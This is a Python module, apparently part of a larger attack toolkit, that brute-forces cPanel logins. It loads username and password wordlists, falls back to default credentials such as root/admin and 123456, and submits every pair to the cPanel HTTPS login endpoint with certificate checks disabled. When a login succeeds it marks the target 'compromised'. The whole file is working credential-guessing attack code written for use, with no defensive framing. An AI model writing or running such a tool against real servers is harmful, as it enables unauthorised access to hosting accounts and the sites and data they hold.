"""cPanel brute force extractor — attempts login via cPanel's HTTPS login endpoint."""

import itertools
import os
import socket
import ssl
import urllib.parse

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

FALLBACK_USERNAMES = ['root', 'admin', 'cpanel', 'webmaster', 'admin-2']
FALLBACK_PASSWORDS = ['', 'admin', 'password', '123456', 'cpanel']

CONNECT_TIMEOUT = 5
READ_TIMEOUT = 5
MAX_RESPONSE_BYTES = 500_000


class CPanelExtractor:
    """Attempts to brute force cPanel login using credentials from wordlists."""

    def __init__(self, ip: str, port: int = 2083, host: str = '', extra_usernames: list | None = None):
        """Initialize with target IP, port, host and optional extra usernames.

        Args:
            ip (str): Target IP address.
            port (int): cPanel HTTPS port, default 2083.
            host (str): Domain name for Host header.
            extra_usernames (list | None): Additional usernames to prepend to wordlist.
        """
        self.ip = ip
        self.port = port
        self.host = host
        self.extra_usernames = extra_usernames or []

    def run(self) -> dict:
        """Load credentials and attempt cPanel login for each combination.

        Returns:
            dict: Status and any valid credentials found.
        """
        print(f"\n  [cPanel] Targeting {self.host}:{self.port}")
        result = {'status': 'open', 'credentials': []}

        token = self._get_login_token()
        if not token and token is not None:
            # token is '' (empty string) — reachable but no token needed
            pass
        elif token is None:
            print(f"  [cPanel] Could not reach login page — skipping")
            result['status'] = 'unreachable'
            return result

        credentials = self._load_credentials()
        print(f"  [cPanel] Testing {len(credentials)} combinations...")

        for username, password in credentials:
            status = self._test_credential(username, password, token or '')
            display = f"{username}:{password if password else '(empty)'}"
            if status == 'success':
                print(f"  [cPanel] *** VALID CREDENTIAL FOUND: {display} ***")
                result['credentials'].append({'user': username, 'password': password, 'status': 'valid'})
                result['status'] = 'compromised'
                return result
            elif status == 'failed':
                print(f"  [cPanel] Invalid: {display}")
            else:
                print(f"  [cPanel] Error testing {display}: {status}")

        return result

    def _get_login_token(self) -> str | None:
        """Verify cPanel login page is reachable within timeout.

        Returns:
            str | None: Empty string if reachable, None if unreachable.
        """
        try:
            response = self._https_request('GET', '/login/', body=None)
            if response is not None:
                return ''
            return None
        except Exception as e:
            print(f"  [cPanel] Token fetch failed: {e}")
            return None

    def _test_credential(self, username: str, password: str, token: str) -> str:
        """Submit cPanel login form and check response for success indicators.

        Args:
            username (str): cPanel username.
            password (str): Password to test.
            token (str): Security token from login page.

        Returns:
            str: 'success', 'failed', or error message.
        """
        import time
        time.sleep(0.3)

        try:
            params = {
                'user': username,
                'pass': password,
                'goto_uri': '/',
            }
            if token:
                params['security_token'] = token

            body = urllib.parse.urlencode(params)
            response = self._https_request('POST', '/login/?login_only=1', body=body)

            if not response:
                return 'no_response'

            if any(indicator in response for indicator in [
                '"status":1',
                '"redirect"',
                'cpsess',
            ]):
                return 'success'

            return 'failed'

        except Exception as e:
            return str(e)

    def _https_request(self, method: str, path: str, body: str | None) -> str | None:
        """Send a raw HTTPS request to cPanel and return the response body.

        Uses hard connect + read timeouts on every socket operation to prevent hanging.

        Args:
            method (str): HTTP method ('GET' or 'POST').
            path (str): URL path to request.
            body (str | None): POST body, or None for GET.

        Returns:
            str | None: Response body as string, or None on failure.
        """
        sock = None
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            sock = socket.create_connection((self.ip, self.port), timeout=CONNECT_TIMEOUT)
            sock = ctx.wrap_socket(sock, server_hostname=self.host.split(':')[0])
            sock.settimeout(READ_TIMEOUT)

            headers = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
            )
            if body:
                headers += f"Content-Length: {len(body)}\r\n"
            headers += "Connection: close\r\n\r\n"

            request = headers.encode()
            if body:
                request += body.encode()

            sock.sendall(request)

            response = b''
            while len(response) < MAX_RESPONSE_BYTES:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
                except OSError:
                    break

            decoded = response.decode('utf-8', errors='ignore')
            if '\r\n\r\n' in decoded:
                _, _, resp_body = decoded.partition('\r\n\r\n')
                return resp_body
            return decoded if decoded else None

        except socket.timeout:
            print(f"  [cPanel] Request timed out", flush=True)
            return None
        except ConnectionRefusedError:
            return None
        except Exception as e:
            print(f"  [cPanel] Request error: {type(e).__name__}: {e}", flush=True)
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def _load_credentials(self) -> list:
        wordlists_path = os.path.join(BASE_DIR, '..', '..', '..', 'wordlists')
        usernames = self._load_wordlist(wordlists_path, 'user', FALLBACK_USERNAMES)[:20]
        usernames = self.extra_usernames + [u for u in usernames if u not in self.extra_usernames]
        passwords = self._load_wordlist(wordlists_path, 'pass', FALLBACK_PASSWORDS)[:50]
        return list(itertools.product(usernames, passwords))

    def _load_wordlist(self, directory: str, keyword: str, fallback: list) -> list:
        """Find and load a wordlist file whose name contains the given keyword.

        Args:
            directory (str): Path to wordlists directory.
            keyword (str): Keyword to match in filename.
            fallback (list): Default list to use if no file found.

        Returns:
            list: Lines from matched file, or fallback list.
        """
        try:
            for filename in os.listdir(directory):
                if keyword.lower() in filename.lower() and filename.endswith('.txt'):
                    filepath = os.path.join(directory, filename)
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = [line.strip() for line in f if line.strip()]
                    print(f"  [cPanel] Loaded {len(lines)} entries from {filename}")
                    return lines
        except FileNotFoundError:
            pass
        print(f"  [cPanel] No wordlist for '{keyword}' — using fallback")
        return fallback